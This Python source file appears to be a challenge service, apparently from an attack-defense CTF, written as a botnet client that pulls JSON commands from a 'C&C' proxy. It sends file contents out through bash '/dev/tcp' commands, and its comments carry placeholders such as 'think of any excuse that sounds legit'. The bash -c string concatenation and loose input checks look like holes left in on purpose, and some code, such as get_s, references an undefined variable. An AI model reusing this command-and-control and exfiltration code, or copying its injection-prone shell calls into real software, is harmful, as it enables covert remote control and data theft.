import json
import subprocess
import sys
import os
import base64
import random
import threading
import re
import time

IP = ['127.0.0.1']
## HEAD ##
random.shuffle(IP)

#PROXY_IP = '127.0' + '.0.1' # strange formatting because of generating code
if len(sys.argv) >= 2 and sys.argv[1] == 'local':
	PROXY_PORT_RECV = 1111
	PROXY_PORT_SEND = 2222
	IP = ['::1'] # TODO
else:
	PROXY_PORT_RECV = 1236
	PROXY_PORT_SEND = 3334

def get_s(i):
	return ''.join(map(lambda x: chr(x + o), s[i]))

PATH = ''

def sendcontent(data, receiver):
	b64 = "[" + base64.b64encode(data.encode()).decode() + ":" + receiver + "]"
	data = subprocess.check_output([
		"bash",
		"-c",
		"echo " + b64 + " >/dev/tcp/" + IP[0] + "/" + str(PROXY_PORT_SEND)
		])

def handle(j, remote):
	if not isinstance(j, dict):
		return
	if not "cmd" in j or not isinstance(j["cmd"], str):
		return
	if not "outid" in j or not isinstance(j["outid"], str):
		return
	if not "sender" in j or not isinstance(j["sender"], str):
		return
	cmd = j["cmd"]
	outid = j["outid"]
	sender = j["sender"]
	if not re.fullmatch("[a-zA-Z0-9]{10}", outid):
		return
	if not re.fullmatch("[a-zA-Z0-9]{10}", sender):
		return
	
	fileCode = ""	
	t = time.time()
	for f in os.listdir(PATH):
		fn = os.path.join(PATH, f)
		dt = t - os.path.getmtime(fn)
		if dt >= 30 * 60:
			os.remove(fn)
		else:
			with open(fn) as i:
				fileCode += i.read()

	if cmd == "INFO":
		co = subprocess.check_output("uname")
	elif cmd == "GETFILE":
		sendcontent(fileCode, sender)
		return # no output to write
	elif cmd == "ECHO":
		if not re.fullmatch("[a-zA-Z0-9 _/|=\+-]{,50}", j["data"]):
			return
		if len(j["data"]) < 50:
			co = j["data"].encode()
			fileCode += j["data"]
		else:
			co = ""
	else:
		return
	with open(PATH + "/" + outid + ".log", "wb") as outf:
		outf.write(co)
	
def handle_list(j, remote):
	if not isinstance(j, list):
		return
	#if len(j) > 4: # We had to comment this out, because of <insert the reason below>
	#	error("Too many commands")
	#	return
	for x in j:
		try:
			handle(x, remote)
		except Exception as e:
			pass

def handle_ip(ip):
	global o
	o = 0 if __debug__ else 7
	global PATH
	PATH = "/var/log/folder"
	try:
		data = subprocess.check_output(["bash", "-c", "cat </dev/tcp/" + ip + "/" + str(PROXY_PORT_RECV)], stderr=subprocess.STDOUT)
		#if len(data) > 400: # We had to comment this out, because of <insert the reason below>
		#	error("Commandlist too long")
		#	return
		j = json.loads(data.decode())
		print("received", j)
		handle_list(j, ip)
	except Exception as e:
		print("Failed on IP ", ip, e)

# We only have one IP here.
# Initially, we could communicate with many C&C servers, but due to <think of any excuse that sounds legit>,
# we now have to proxy all msgs through this server
# it requests the commands from all servers on behalf of us and merges them before sending us
# It selectivly forwards our responses to the specified receiver 
# Luckily, we could keep the communication protocol unchanged
for ip in IP:
	t = threading.Thread(target=handle_ip, args=(ip,))
	t.start()
